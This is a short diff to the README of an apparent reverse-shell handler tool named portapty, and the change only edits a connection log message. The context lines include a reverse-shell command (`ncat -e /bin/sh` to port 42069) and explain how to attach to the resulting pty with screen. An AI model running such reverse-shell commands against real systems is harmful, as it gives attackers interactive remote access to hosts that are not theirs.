@@ -30,7 +30,7 @@ both standard reverse shells on all IPv4 and v6 addresses (dual to IPv6 dual sta
 
 On connection (like by `ncat -e /bin/sh :: 42069`), you will see messages like:
 ```
-[portapty] [::1]:57388 available on /dev/pts/63
+[portapty] SuperSecureServer ([::1]:57388) available on /dev/pts/63
 ```
 If you run `screen /dev/pts/63` on this created pty, you will be able to interact with it fully, as if it were an ssh session.
 
